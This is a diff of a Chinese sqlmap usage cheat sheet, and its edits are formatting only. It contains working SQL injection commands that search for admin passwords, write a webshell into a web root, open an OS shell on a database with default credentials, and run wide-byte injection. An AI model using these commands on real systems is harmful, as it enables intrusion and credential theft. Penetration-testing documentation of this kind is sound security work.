@@ -5,6 +5,7 @@ description: SQL注入辅助工具
 # Sqlmap
 
 > 内容来源于团队库1earn：[1earn-sqlmap](https://github.com/ffffffff0x/1earn/blob/c44ee79973ff0478a82ebf3cf0cbc62ebaa174a6/1earn/Security/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/sqlmap.md)
+
 ## 基础使用
 
 **检测注入**
@@ -54,9 +55,10 @@ sqlmap -r "c:\tools\request.txt" -dbms mysql -D dedecms --search -C admin,passwo
 
 首先找需要网站的物理路径,其次需要有可写或可读权限.
 
-- -file-read=RFILE 从后端的数据库管理系统文件系统读取文件 (物理路径)
-- -file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件 (mssql xp_shell)
-- -file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径
+* \-file-read=RFILE 从后端的数据库管理系统文件系统读取文件 (物理路径)
+* \-file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件 (mssql xp\_shell)
+* \-file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径
+
 ```bash
 sqlmap -r aaa.txt --file-dest "e:\php\htdocs\dvwa\inc\include\1.php" --file-write "f:\webshell\1112.php"
 
@@ -106,15 +108,17 @@ sqlmap -d "mysql://root:root@192.168.1.1:3306/mysql" --os-shell
 ```
 
 **宽字节检测**
+
 ```bash
 sqlmap -u URL --dbms mysql --prefix "%df%27" --technique U -v 3     # 宽字节检测
 ```
 
 **union 语句测试**
+
 ```bash
 --union-cols=UCOLS  测试UNION查询的SQL注入的列的范围
 --union-char=UCHAR  用来破解列数的字符
 --union-from=UFROM  在UNION查询的FROM部分中使用的表
 ```
 
----
+***
